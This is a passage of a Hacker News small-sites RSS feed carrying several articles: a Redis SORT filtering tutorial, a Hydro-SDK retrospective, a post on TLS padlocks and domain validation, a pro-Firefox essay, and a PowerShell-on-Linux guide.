<tr>
<th>key</th>
<th>price</th>
<th>created_at</th>
</tr>
</thead>
<tbody>
<tr>
<td>hset:product:id:1</td>
<td>9.99</td>
<td>2021-01-17T14:00:00Z</td>
</tr>
<tr>
<td>hset:product:id:2</td>
<td>29.99</td>
<td>2021-01-17T15:00:02Z</td>
</tr>
<tr>
<td>hset:product:id:3</td>
<td>49.99</td>
<td>2021-01-17T16:00:04Z</td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p><em>Note</em> : Contrary to a classic set, we have here 3 distinct HSets for each key. For nomenclature reasons and to be able to access the keys quickly, I always prefix them with <code>hset:</code>.</p>
<p>To create these entries in Redis:</p>

<p>Now, to get the <code>price</code> field of the product with the identifier <code>2</code>:</p>

<p>To retrieve all fields, just use <code>HGETALL</code>:</p>

<p>Well, we now have all the elements to allow us to query our data in a very similar way to what we know with SQL. To do this, we will use the <code>SORT</code> command, which, contrary to what its name indicates, allows us to do much more than a simple sort.</p>

<p>I invite you to go to the official documentation page of the <a href="https://redis.io/commands/sort">SORT</a> command.</p>
<p>This command allows to sort a set in ascending/descending alphanumeric order but also to sort the data according to a column provided in a <code>HSet</code>.</p>
<p>We can also directly give it the name of the set corresponding to our filter (category <code>electronic</code> for example). Let's then imagine the following SQL query:</p>

<p>This request allows us to obtain the price of products in the "electronic" category, ordered by descending creation date.</p>
<p>With Redis's <code>SORT</code> function, to make this same request, you just have to do:</p>

<p>Here, the <code>*</code> pattern will be replaced by each value provided in the Set <code>set:products:category:electronic</code>, in our case the product identifier.</p>
<p>In case you also have single keys/values in the form <code>product:id:1</code> with serialized data in a particular format, you can also retrieve them by passing the <code>GET product:id:*</code> pattern to the SORT method.</p>

<p>The SQL query remains quite simple in this case but it is possible to go further by making intersections or unions between several blinds. These can be done using the <a href="https://redis.io/commands/sinterstore">SINTERSTORE</a> and <a href="https://redis.io/commands/sunionstore">SUNIONSTORE</a> commands.</p>
<p>For example, if you have two sets: <code>set:products:category:electronic</code> and <code>set:products:category:computer</code> and there are products in common in both blinds, you can create a Set containing the elements in common in both blinds with:</p>

<p>You can then use this set as a classic set. It is also possible to generate this set on the fly (without storing it in Redis) with <a href="https://redis.io/commands/sinter">SINTER</a> or <a href="https://redis.io/commands/sunion">SUNION</a>.</p>

<p>Redis remains a very good tool for distributed caching, is certainly not destined to become your main database, but in some cases, it can be useful to know these manipulations in order to allow you to better exploit your data.</p>
<p>I hope this article has been useful, don't hesitate to contact me for any further information.</p>
</div></div></div>]]>
            </description>
            <link>https://vincent.composieux.fr/article/redis-filter-and-sort-your-data-in-a-sql-like-way-using-sort</link>
            <guid isPermaLink="false">hacker-news-small-sites-25814672</guid>
            <pubDate>Sun, 17 Jan 2021 20:35:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One Year of Hydro-SDK]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25814519">thread link</a>) | @chgibb
<br/>
January 17, 2021 | https://chgibb.github.io/one-year-of-hydro-sdk/ | <a href="https://web.archive.org/web/*/https://chgibb.github.io/one-year-of-hydro-sdk/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><a href="https://github.com/hydro-sdk/hydro-sdk">Hydro-SDK</a> has been my passion project for the last (roughly) year. While still very pre-alpha, I thought it was about time to collect my thoughts on its past and future in one place and reflect on the journey.</p>

<p><a href="https://github.com/hydro-sdk/hydro-sdk">Hydro-SDK</a> is a project with one large, ambitious goal. “Become React Native for Flutter”.<br>
It aims to do that by:</p>
<ol>
  <li>Decoupling the API surface of Flutter from  the Dart programming language.</li>
  <li>Decoupling the development time experience of Flutter from the Dart programming language.</li>
  <li>Providing first-class support for over-the-air distribution of code.</li>
  <li>Providing an ecosystem of packages from <code>pub.dev</code>, automatically projected to supported languages and published to other package systems.</li>
</ol>

<p>It’s composed of:</p>
<h3 id="common-flutter-runtime-cfr">Common Flutter Runtime (CFR)</h3>
<ul>
  <li>A Lua 5.2 interpreter with support for hot reload, clean Dart &lt;-&gt; Lua interop and compiling Lua bytecode into Dart source code.
    <h3 id="hydroc-compiler">Hydroc Compiler</h3>
  </li>
  <li>A toolchain based on <a href="https://github.com/TypeScriptToLua/TypeScriptToLua">Typescript to Lua</a>, providing incremental compilation of Typescript source code into Lua bytecode, source mappings, file watching and serving.
    <h3 id="structured-wrapper-and-interface-generator-for-dart-swid">Structured Wrapper and Interface generator for Dart (SWID)</h3>
  </li>
  <li>A system for automatically producing Hydroc and CFR compatible projections from a Dart package.
    <h3 id="waveform">Waveform</h3>
  </li>
  <li>An umbrella project of tooling and Github bots providing automatic upgrade infrastructure for the Hydro-SDK Github organization; automated update PRs, wrangling of dependencies between <code>package.json</code> and <code>pubspec.yaml</code>, merge conflict resolution and topic branch updating.</li>
</ul>

<p>Hydro-SDK was born out of my experiences as a brand new Flutter developer in mid-2019. A Flutter developer who had never even heard of Flutter (or Dart for that matter) before being hired for a Flutter role.</p>

<p>I’m not a very old developer. At the time of writing, I’m only 1.71 JQuerys old. After spending my formative years hacking on C++98, followed by a few years of JQuery and JQuery UI before finally discovering ReactJS and falling deeply and maddly in love with Typescript, Flutter was a revelation. No more changing one line in one function in one header and having to go take a walk as three quarters of the project recompiles. No more burning my fingers on my Macbook keyboard hoping I can find the bug in my React frontend before my fingerprints are gone for good. Stateful hot reload was the new normal.</p>

<p>In addition to the positive revelations I felt for Flutter’s hot reload workflow and the simplicity and power of it’s API compared to traditional HTML+CSS, my reactions to Dart were roughly as follows:</p>
<ol>
  <li>Whiplash having to get used to nominal typing again</li>
  <li>Horror at the depth of reification</li>
  <li>Frustration at (relatively) in-expressive generics and poor inference</li>
  <li>Wonder and bewilderment at null related errors</li>
  <li>Acceptance. An understanding of Dart’s history, it’s many customers (in addition to Flutter) its flaws and its successes</li>
</ol>

<p>In August of 2019 I began experimenting trying to build a general system to allow Flutter web content to exist nicely within a larger Flutter mobile shell. I thought if I couldn’t quite get around Dart’s shortcomings, I could at least build something to paper over the shortcomings in mobile deployment. This work ultimately didn’t lead very far.</p>

<p>My feelings about the developer experience of Dart never quite went away. I became fixated on the idea of bringing the tooling, workflow and APIs of Flutter into other languages. Late 2019 saw experimentation with exposing Flutter APIs into Javascript via a C++ bridge with DuktapeJS. When I realised that every single <code>new</code> of a Dart object from Javascript was leaking memory and their didn’t seem to be a good path to get the Dart GC and Duktape’s GC to play nice together, I abandoned the initiative.</p>

<p>I abandoned the idea of embedding an interpreter and looked to building one with Dart. This led to my discovery of <a href="https://github.com/cowboyd/flutterscript/commits/master">Flutterscript</a>, a project aimed at providing a scripting environment through a Lisp interpreter. I spent far more late nights than I should have trying to bring the Flutterscript interpreter to the point where it could run <a href="https://github.com/akapav/js">a JS to Lisp transpiler</a>. This included porting pieces of the <a href="http://www.sbcl.org/">Steel Bank Common Lisp</a> runtime to Flutterscript. I also spent some time trying to get <a href="https://github.com/cowboyd/flutterscript/commits/master">Flutterscript</a> to run code output by <a href="https://github.com/froggey/Iota">Iota</a>. I eventually realized that even if I could cobble such a monster together, it would be impossible to debug and even harder to attempt to tune for performance.</p>

<p>In early 2020, I stumbled on <a href="https://github.com/TypeScriptToLua/TypeScriptToLua">Typescript to Lua (TSTL)</a>. A transpiler offering transpilation from Typescript to Lua sourcecode. This seemed like the beacon in the storm. I immediately set out to start writing a Lua interpreter in Dart. After some progress on my own hand-rolled interpreter, I discovered <a href="https://github.com/PixelToast/dartlua">DartLua</a> which had me beat both in terms of developer-hours and feature set. A (heavily modified) DartLua has sat at the center of Hydro-SDK every since.</p>

<p>The first “Hello World From Typescript!” Flutter app hit the screen of an iOS simulator in February 2020. I spent the next 6 months or so building a marshalling system to allow clean Dart and Lua interop as well as hot reloading of running Lua bytecode. In response to some early feedback about performance concerns, a CLI was built to allow compiling Lua bytecode into Dart source code.</p>

<p>Eventually I got greedy with these successes and looked to expand the repertoire of the runtime system I was now calling the Common Flutter Runtime (CFR) by building support into Hydro’s toolchain for <a href="https://haxe.org/">the Haxe programming language</a> in addition to the already existing Typescript support. Shortly after the first “Hello World from Haxe”! Flutter app, I overwhelmed myself trying to expand and maintain Flutter and Dart APIs across both Typescript and Haxe and so dropped support for Haxe.</p>

<p>In mid 2020 I looked to double down on support for Typescript by building out the at the time badly neglected cupertino Flutter APIs.</p>

<p>By late September, I came to the realisation that the manual process of writing Typescript and Dart glue to project APIs into Typescript could probably be automated. I put down work on manually writing cupertino projections and looked to start automating the process.</p>

<p>The project of the day ever since has been on what has come to be named Structured Wrapper and Interface Generator for Dart (SWID). The name being a nod to the <a href="http://www.swig.org/exec.html">SWIG  Project</a>. In just three months time, SWID has come very far. Being able to produce projections for large swaths of Flutter Foundation as well as Dart UI and Dart Core. The focus at the time of writing has been to make sure the code produced by SWID is natural for a Typescript programmer and is correct. This is being done by porting pieces of Dart-SDK’s <a href="https://github.com/dart-lang/co19">CO19 specification test suite</a> into Typescript to test SWID produced projections for a select few Dart Core classes.</p>

<h2 id="future-work">Future Work</h2>
<h3 id="ambient-computing-ambient-packages">Ambient Computing, Ambient Packages</h3>
<p>Looking to the future, SWID will be the cornerstone in bridging the gap between <code>pub.dev</code>, Hydro-SDK and <code>npm</code>. Hopefully bringing the power of each together into one repository of packages. <code>pub.dev</code> package authors will get an automated Typescript mirror of their work, app developers will get to pick and choose from the best of <code>pub.dev</code>, and <code>npm</code>.</p>

<h3 id="ambient-computing-ambient-languages">Ambient Computing, Ambient Languages</h3>
<p>In addition to enabling a wider package ecosystem, SWID will provide the foundation for wider language support. SWID is structured in a classic frontend-backend compiler design. Typescript and Dart both just happen to be backends. Adding support for additional languages, like <a href="https://haxe.org/">the Haxe programming language</a>, C# via <a href="https://github.com/yanghuan/CSharp.lua">CSharp.lua</a> or Java or Kotlin via <a href="https://github.com/jtransc/jtransc">JTransc</a> will be as easy as adding a new backend to SWID.</p>

<h3 id="in-band-out-of-band">In Band, Out of Band</h3>
<p>At the time of writing, the developer experience for deploying an app making use of Hydro-SDK’s over the air code loading is shakey at best. Planning is beginning on what a first-class hosting, deployment, flagging and analytics service might look like and how to best integrate it with Hydro-SDK.</p>

<p>My hope is that other developers will find Hydro-SDK to be an incredible value add to their workflows and development processes. At worst, Hydro-SDK presents an incredible, beautiful fractal of all the problem spaces of compiler design, optimization, virtual machines and programming language design that I find endlessly fascinating and fulfilling.</p>

  </div></div>]]>
            </description>
            <link>https://chgibb.github.io/one-year-of-hydro-sdk/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25814519</guid>
            <pubDate>Sun, 17 Jan 2021 20:19:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[About Domain Validation and Padlocks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25814354">thread link</a>) | @autoditype
<br/>
January 17, 2021 | https://jomo.tv/security/domain-validation-and-padlocks | <a href="https://web.archive.org/web/*/https://jomo.tv/security/domain-validation-and-padlocks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <article itemscope="" itemtype="http://schema.org/BlogPosting">

    

    <section itemprop="articleBody">
      <p><strong>Note</strong>: This post is a copy of <a href="https://paypal.gift/">https://paypal.gift</a>.</p>

<hr>

<p>Web browsers show a padlock icon next to the URL of HTTPS websites with a valid <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">TLS certificate</a>. This padlock indicates that the <em>connection</em> between your browser and the server is secure.</p>

<p><img src="https://jomo.tv/img/fakepal.png#border" alt="PayPal phishing"></p>

<p>It does <em>not</em> indicate that the website is safe to use, or that the domain name is not misleading, or anything, really. It just means that you’re connected to the address displayed in the address bar with nobody else reading or manipulating content. This type of certificate is also known as <a href="https://en.wikipedia.org/wiki/Domain-validated_certificate">Domain Validation</a> (“DV”) certificate and is the most common.</p>

<p>A different validation method called <a href="https://en.wikipedia.org/wiki/Extended_Validation_Certificate">Extended Validation</a> (“EV”) exists, where the company owning<sup id="fnref:1"><a href="#fn:1">1</a></sup> the domain is included in the certificate, but otherwise it’s not very different. For sites with these certificates, browsers usually show a padlock and the company name next to the URL, which can give the user a false sense of security. See <a href="https://stripe.ian.sh/">Stripe, Inc</a> and <a href="https://www.typewritten.net/writer/ev-phishing/">Identity Verified</a>.</p>

<p><img src="https://jomo.tv/img/ev.png#border" alt="Website with EV cert"></p>

<p>This website, <em>paypal.gift</em>, uses a DV certificate from <a href="https://letsencrypt.org/">Let’s Encrypt</a>. Some people would argue that they shouldn’t have issued the certificate because the website is obviously not owned by “the real PayPal” and/or because it might be used for malicious activities. However, this is ultimately wrong because <strong>a certificate does not certify that a website is safe to use!</strong> (whatever that even means). Doing so wouldn’t be an easy task, anyway. What is a malicious site and what’s not? Who gets to decide? Is <a href="https://en.wikipedia.org/wiki/Criticism_of_Facebook">Facebook</a> a malicious site? And if so, should they send data in plain text?</p>

<p>Some people still expect the <span title="Certificate Authority">CA</span>s to do something about bad sites. Let’s Encrypt disagrees, but for a while decided to use the Google <a href="https://en.wikipedia.org/wiki/Google_Safe_Browsing#Privacy">Safe Browsing</a> API to figure out if a domain is a known bad website (by Google’s terms) before issuing a certificate. They eventually <a href="https://community.letsencrypt.org/t/let-s-encrypt-no-longer-checking-google-safe-browsing/82168">stopped doing that</a> because it’s simply not relevant for the certificate. It would also give Google and their false positives<sup id="fnref:2"><a href="#fn:2">2</a></sup> the power to decide.</p>

<p>What Let’s Encrypt <em>does</em>, however, is holding a blacklist of “high value” domains<sup id="fnref:3"><a href="#fn:3">3</a></sup> for which they won’t automatically issue certificates until the legitimate domain owner explicitly asks them to. This is to lower the practical impact of a hostile domain takeover or <a href="https://en.wikipedia.org/wiki/BGP_hijacking">BGP hijack</a>. This blacklist includes <code>paypal.com</code>, but it does not include previously unregistered <code>paypal.*</code> domains, as I demonstrated in April 2018.<sup id="fnref:4"><a href="#fn:4">4</a></sup> This approach obviously does not scale and is only in place to prevent the worst, although it’s not the responsibility of the CA to prevent domain takeovers. They only validate that someone <em>technically</em> controls the domain.</p>

<p>Ultimately all HTTP websites should move to HTTPS, regardless of their content, and browsers should only indicate when a connection is <em>not</em> secure, instead of the other way around. Padlocks and company names need to disappear. And luckily this is what’s already happening. More than ¾ of page loads now <a href="https://letsencrypt.org/stats/#percent-pageloads">use HTTPS</a>. Mozilla has <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">deprecated HTTP</a> in 2015. Firefox, Safari and Chrome are already marking some or all <a href="https://badssl.com/#http">HTTP sites</a> as insecure. <a href="https://www.chromium.org/Home/chromium-security/marking-http-as-non-secure">Eventually</a> browsers won’t connect to HTTP sites, just like sites with broken HTTPS.</p>

<p><img src="https://jomo.tv/img/http.png#border" alt="Browser warning about HTTP"></p>

<hr>



    </section>

    <section>Tags: web-browsers, ssl-certificates, tls, domain-validation, padlocks</section>

    

  </article>
</div></div>]]>
            </description>
            <link>https://jomo.tv/security/domain-validation-and-padlocks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25814354</guid>
            <pubDate>Sun, 17 Jan 2021 20:01:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Objects from the UK's Science Museum that have zero views: “Never Been Seen”]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25814325">thread link</a>) | @savara
<br/>
January 17, 2021 | https://thesciencemuseum.github.io/never-been-seen/index.html | <a href="https://web.archive.org/web/*/https://thesciencemuseum.github.io/never-been-seen/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://thesciencemuseum.github.io/never-been-seen/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25814325</guid>
            <pubDate>Sun, 17 Jan 2021 19:58:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It is your moral obligation to use Firefox (2019)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25814308">thread link</a>) | @Bluestein
<br/>
January 17, 2021 | https://0x46.net/thoughts/2019/04/09/use-firefox/ | <a href="https://web.archive.org/web/*/https://0x46.net/thoughts/2019/04/09/use-firefox/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div>  <p>You may have recently read that a new version of Internet Explorer (currently hiding under an alias Microsoft Edge) based on Chromium has been released. According to <a href="https://web.archive.org/web/20190403181903/https://en.wikipedia.org/wiki/Usage_share_of_web_browsers">current market share rankings</a> this move puts Chromium-based browsers well above 75% of the desktop browser market share. The biggest contributor to this statistic is of course Google Chrome. For comparison Firefox at the height of its popularity barely managed to cross 30% market share.</p> <h2>How did that happen?</h2> <p>Personally I am able to identify several factors that contributed to the success of Google Chrome. </p> <h3>Aggressive marketing</h3> <p>As of now <em>google.com</em> remains the most visited website in the world by a significant margin. Google has been advertising Chrome on its home page, in search results, in their competitor's products and all over the web. Not only did it have the advertising platform capable of reaching the highest number of users in the world but also the resources to run a world-wide campaign on the scale never seen before in the web browser market.</p> <h3>Performance</h3> <p>Chrome displayed amazing performance improvements over competing browsers from day one. While Internet Explorer has always been a synonym for abysmal performance, Firefox started lagging behind the user needs and was struggling to deliver its major multi-processing feature dubbed Electrolysis as Chrome adoption was racing forward.</p> <p>A couple of years after the release of Chrome significant developments in the area of interactive websites, WebGL and other ground breaking technologies started to appear online. At the time Chrome was often the only browser able to run all the interesting web experiments or even playback 1080p videos on old hardware without breaking a sweat. This coupled with the growing frustration of Firefox users has led to faster adoption rates.</p> <h3>Chrome Web Store</h3> <p>Chrome capitalized on one of the most popular features of Firefox offering the users an easy way of installing various browser extensions. With the developers being actively encouraged to write new extensions many equivalents of popular Firefox addons were quickly created. An ability to install extensions has always been a large reason behind users choosing Firefox over Internet Explorer and allowed many of them to switch to Chrome.</p> <h3>Standards adoption</h3> <p>Another of the main selling points of Firefox over Internet Explorer was the standards adoption rate. Both the developers and the users profoundly hated the latter for its stagnant development, slow version adoption and very often buggy and incomplete implementations. For a long time a message "works best with Firefox" could be seen on some websites attempting to use newer standards and Firefox was a breath of fresh air in the web industry.</p> <p>After being released Chrome managed to beat everyone, including Firefox, adopting new standards and breakthrough technologies quicker than any other browser in the market. This was widely advertised with various demos and "Chrome experiments".</p> <h3>Version adoption</h3> <p>Chrome updates the browser to the newest version at launch just as Firefox does ensuring that all the newest features and security fixes are always in place and available for the developers. This still contrasts with the model of Microsoft Edge releases which are tightly coupled to the operating system updates (just as the browser itself is tightly coupled to the OS itself).</p> <h3>Integration with various Google services</h3> <p>Chrome integrates with widely used Google services allowing the users to easily access their data and to sync it between various devices. This was supported by the fact that the most popular smartphone operating system in the world was also created by Google and integrates with the same services.</p> <h2>What does it mean?</h2> <p>While both Google Chrome and Microsoft Edge themselves are proprietary products they are based on the open source Chromium project utilizing Blink and V8 engines. This means that in practice the entire browser market is currently based on free and open solutions. This is obviously a wonderful thing and Google Chrome itself appears to be a good and nice to use product. Unfortunately as always the world is not as beautiful as we would like it to be.</p> <p>As the Chromium project is largely financed by Google and used by Chrome, the most popular browser in the world, Google exerts a significant political pressure over the project and de facto controls it. This control can at this point effectively be used in order to shape the web and push it in the desired direction.</p> <p>There were already a couple of cases of Google pushing their agenda and breaking various standards. As an example <a href="https://web.archive.org/web/20190409004832/http://tonsky.me/blog/chrome-intervention/">one of them</a> involved DOM APIs while <a href="https://web.archive.org/web/20190409214049/https://stackoverflow.com/questions/12374442/chrome-ignores-autocomplete-off">another one</a> involved breaking one of the <code>&lt;input&gt;</code> tag attributes. Whether or not you agree with those changes, Google decided to deliberately break the beforementioned standards.</p> <p>Not only that, but the attack itself comes from multiple fronts. Google's armies march in broad daylight burning the countryside, this we know. But, in secret, another force approaches from an unexpected direction: their fleet sails to capture the online media. Google is currently pushing the adoption of a technology called AMP. Only news websites offering a full or a partial alternative implementation available in this technology are <a href="https://web.archive.org/web/20190403162948/https://www.theregister.co.uk/2017/05/19/open_source_insider_google_amp_bad_bad_bad/">promoted in certain places in Google search results</a>. This effectively strikes at the core principles of the web forcing the developers to use a certain technology in order to promote the websites. This is particulary efficient with Google having a de facto monopoly in the online advertising business and comparable to the worst anti-competitive plots and schemes that Microsoft is well known for.</p> <p>All those facts combined threaten the web in the same way in which Microsoft and its practices did. No organisation should have a monopoly over the standards shaping the web - and the fact is that a similar situation already led to immense frustration and cries for help from various developers in the past. History is now repeating itself however the reactions are way more subdued and it seems that unfortunately many of us are content with it as long as the browser which controls the market is kept up to date.</p> <p>Overall this move by Microsoft brings the number of significant implementations in the browser market back to two. As we can learn from Microsoft's failures it is at this point unrealistic to believe that a new browser can be written from scratch. Our rendering and JavaScript engines are at this point so complicated that creating a new product from scratch is less realistic than creating an entire new operating system together with various user space programs. It appears that with the way things are heading right now the complexity of our web standards will lead to a downwfall of the web as we know it. With every year it is more likely that one day you will not be able to create a website using the technologies of your choosing and you will not be able to make it behave as you see fit. Others will make those decisions for you.</p> <h2>How can we change that?</h2> <p>In the short term? Right now the only solution I can see is trying to even out the scales and switching back to Firefox, if you haven't already done so. Firefox is a modern browser and its performance has been drastically improved with recent updates. If you want to try to retain balance - try using it again.</p> <p>In the long term? Currently everything points to the fact that the complexity of the web will be its downfall with all browsers converging on a single implementation of the standards. I do not see what a long term action we can take to prevent it but I do believe that idenfiying a problem is important to start devising solutions to it.</p> <p> 2019-04-09 </p> </div> </div></div>]]>
            </description>
            <link>https://0x46.net/thoughts/2019/04/09/use-firefox/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25814308</guid>
            <pubDate>Sun, 17 Jan 2021 19:57:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux and Powershell]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25814226">thread link</a>) | @jajjarax
<br/>
January 17, 2021 | https://matteoguadrini.github.io/posts/linux-and-powershell/ | <a href="https://web.archive.org/web/*/https://matteoguadrini.github.io/posts/linux-and-powershell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  <section>
    <p><img src="https://www.lffl.org/wp-content/uploads/2018/07/microsoft-powershell.jpg" alt="Linux and powershell"></p>
<h2 id="what-powershell">What powershell?</h2>
<p><strong>Powershell</strong> is an object-based shell born in Microsoft in 2006, made open source 10 years later. It is characterized by commands, called <em>cmdlets</em>, which respect a certain pattern. An example cmdlet is as follows:</p>
<div><pre><code data-lang="powershell"><span>Get-ChildItem</span> <span>-Path</span> <span>value</span>
</code></pre></div><p>The pattern in question is <code>Verb-Noun -Option argument</code>, where <em>Verb</em> is a list of <a href="https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.1">verbs</a>. <em>Noun</em> is a description of what impacts the command verb. The <em>Option</em> instead are preceded by a dash and its name; to follow, all the <em>arguments</em> of the option.</p>
<p>This pattern guarantees two things:</p>
<ol>
<li><strong>readability</strong>: if you read the command, you know what it does. For example, the previous command shows that: I get all the child objects of a given path (files and folders).</li>
<li><strong>standard</strong>: following such a strict standard, it is possible to introduce various new commands already knowing (thanks to readability) what they do.</li>
</ol>
<h2 id="why-powershell-on-linux">Why powershell on Linux?</h2>
<p>Linux has a great scripting tool: <em>bash</em> . Bash is a shell that provides us with a very simple but effective scripting language to write various automatisms. The only problem with bash is that any output is a string and must be treated as such; therefore, we use the same task we took as an example in powershell; we list the files and directories in a given path:</p>
<p>The output produced by this command is a string, so if we need to search for something we have to pass the output as the input of another command, through the pipeline.</p>
<div><pre><code data-lang="bash">ls -l path <span>|</span> grep whatever
</code></pre></div><p>Each powershell output is an object. Each object has its own properties that can be used through other cmdlets. For example, the above command will output a <strong>System.Array</strong> type. This type of object can be used by an iterator (such as the <code>for</code> loop) or by a filter cmdlet, such as <code>Where-Object</code>.</p>
<p>Powershell is an excellent tool for a linux distribution because it offers a series of commands useful for developing tools and automatisms that are very difficult to implement with simple strings.</p>
<h2 id="installation-on-linux">Installation on Linux</h2>
<p>Depending on your distribution, installing powershell on Linux is a fairly simple task. If you have Debian or Ubuntu, we can install it thanks to <em>snapd</em> , like this:</p>
<pre><code data-lang="console">$ sudo apt install snapd
$ snap install powershell
</code></pre><p>Instead on Red Hat based distributions, run the following commands:</p>
<pre><code data-lang="console">$ curl https://packages.microsoft.com/config/rhel/7/prod.repo | sudo tee /etc/yum.repos.d/microsoft.repo
$ sudo yum install -y powershell
</code></pre><p>To activate powershell, just type <code>pwsh</code>.</p>
<h3 id="other-distribution">Other distribution</h3>
<p>For installation on other distributions refer to the official Microsoft <a href="https://docs.microsoft.com/it-it/powershell/scripting/install/installing-powershell-core-on-linux?view=powershell-7.1">installation page</a>.</p>
<h2 id="scripts-and-modules-automations">Scripts and modules: automations</h2>
<p>One of the advantages of powershell is that you can save commands and various code parts in script and module files.</p>
<h3 id="scripts">Scripts</h3>
<p>To create a script file, just write powershell to a file with the <em>.ps1</em> extension, and parse it to the <code>pwsh</code> interpreter.</p>
<div><pre><code data-lang="powershell"><span># file myscript.ps1</span>

<span># Get all file modified in the last 3 days</span>
<span>Get-ChildItem</span> <span>-Path</span> <span>path</span> <span>-Recurse</span> <span>|</span> <span>Where-Object</span> <span>{</span>
  <span>$_</span><span>.</span><span>LastWriteTime</span> <span>-gt</span> <span>(</span><span>Get-Date</span><span>).</span><span>AddDays</span><span>(-</span><span>3</span><span>)</span> 
<span>}</span>
</code></pre></div><p>We have created a script that tells us all files changed in the last 3 days. Fantastic. Now let’s call it from the command line: <code>pwsh myscript.ps1</code></p>
<h3 id="modules">Modules</h3>
<p>Not all tasks are sequential commands and not all tasks can be contained in a single powershell file. For this, we will use module to collect our functions.</p>
<p>Let’s take the script from earlier. Let’s turn it into a function and put it into a module. The module consists of a module file with the extension <code>.psm1</code> and a module manifest file with the extension<code> .psd1</code>. First, let’s create the module.</p>
<pre><code data-lang="console">$ mkdir mymodule
$ touch mymodule/mymodule.psm1
$ pwsh
PowerShell 7.1.1
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS &gt; New-ModuleManifest -Path mymodule/mymodule.psd1 -ModuleVersion "0.0.1" -Author "YourNameHere"
</code></pre><p>We have created the structure of the module. Now, let’s do a function called <code>Get-LastThreeDaysModifiedFiles</code> containing the above script.</p>
<div><pre><code data-lang="powershell"><span>#  mymodule/mymodule.psm1</span>

<span>New-Alias</span> <span>-Name</span> <span>"ls3"</span> <span>Get-LastThreeDaysModifiedFiles</span>

<span>function</span> <span>Get-LastThreeDaysModifiedFiles</span><span>(</span><span>$Path</span><span>)</span> <span>{</span>
	<span>Get-ChildItem</span> <span>-Path</span> <span>$Path</span> <span>-Recurse</span> <span>|</span> <span>Where-Object</span> <span>{</span>
  		<span>$_</span><span>.</span><span>LastWriteTime</span> <span>-gt</span> <span>(</span><span>Get-Date</span><span>).</span><span>AddDays</span><span>(-</span><span>3</span><span>)</span> 
	<span>}</span>
<span>}</span>
</code></pre></div><p>Now edit our <em>mymodule.psd1</em> manifest file to add our function and alias for export. Find these two variables and edit them as follows:</p>
<div><pre><code data-lang="powershell"><span>#  mymodule/mymodule.psd1</span>
<span>$FunctionsToExport</span> <span>=</span> <span>@(</span><span>'Get-LastThreeDaysModifiedFiles'</span><span>)</span>
<span>$AliasesToExport</span> <span>=</span> <span>@(</span><span>'ls3'</span><span>)</span>
</code></pre></div><p>Now copy our module folder <code>mymodule</code> to the following path (for all users) <code>/usr/local/share/powershell/Modules</code> or <code>~/.local/share/powershell/Modules</code> (for your user), and open new powershell session:</p>
<div><pre><code data-lang="powershell"><span>PS </span><span>&gt;</span> <span>Get-LastThreeDaysModifiedFiles</span> <span>/</span><span>your</span><span>/</span><span>path</span><span>/</span>
<span>PS </span><span>&gt;</span> <span>ls3</span> <span>/</span><span>your</span><span>/</span><span>path</span><span>/</span>
</code></pre></div><h2 id="most-used-modules">Most used modules</h2>
<p>Of course it is possible to install modules from the <a href="https://www.powershellgallery.com/">official repository</a>, for various uses. On a Linux distribution, for example, the <a href="https://github.com/MatteoGuadrini/PSCouchDB">PSCouchDB module</a> is useful if you are an administrator of a no-sql database such as CouchDB.</p>
<div><pre><code data-lang="powershell"><span>PS </span><span>&gt;</span> <span>Install-Module</span> <span>-Name</span> <span>PSCouchDB</span>
<span>PS </span><span>&gt;</span> <span>Get-CouchDBDatabase</span>
</code></pre></div><p>This module simplifies the management of the databases and documents that define the characteristic structure of CouchDB. Alternatively, you can use <code>curl</code> but commands for complex tasks will be very long.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Finally, the goal of powershell in general is to facilitate the end user in scripting simple and complex tasks. Bash is a great tool for many tasks, but powershell can help solve some problems like filtering complex output, thanks to its object-oriented structure. Definitely a great choice for many activities.</p>

  </section>

  
</article></div>]]>
            </description>
            <link>https://matteoguadrini.github.io/posts/linux-and-powershell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25814226</guid>
            <pubDate>Sun, 17 Jan 2021 19:49:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lorenz Attractor]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813956">thread link</a>) | @autoditype
<br/>
January 17, 2021 | https://mathisonian.github.io/lorenz/ | <a href="https://web.archive.org/web/*/https://mathisonian.github.io/lorenz/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="idyll-mount">
